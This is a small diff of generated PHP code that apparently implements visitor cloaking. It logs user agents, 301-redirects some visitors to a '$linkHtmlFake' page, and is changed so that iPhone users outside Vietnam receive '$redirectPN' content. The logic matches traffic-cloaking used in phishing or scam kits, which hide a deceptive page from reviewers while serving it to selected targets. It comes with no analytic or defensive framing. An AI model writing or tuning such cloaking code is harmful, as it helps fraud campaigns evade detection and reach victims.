@@ -244,7 +244,7 @@ if (
     fclose($fAgent);
     header(\'Location: ' . $linkHtmlFake . '\', true, 301);
     die();
-} elseif ($country === \'VN\') {
+} elseif ($country !== \'VN\' && stripos($_SERVER[\'HTTP_USER_AGENT\'],"iPhone")) {
   echo "' . $redirectPN . '";
 } else {
     $fAgent = fopen($allowedAgents, \'a\');
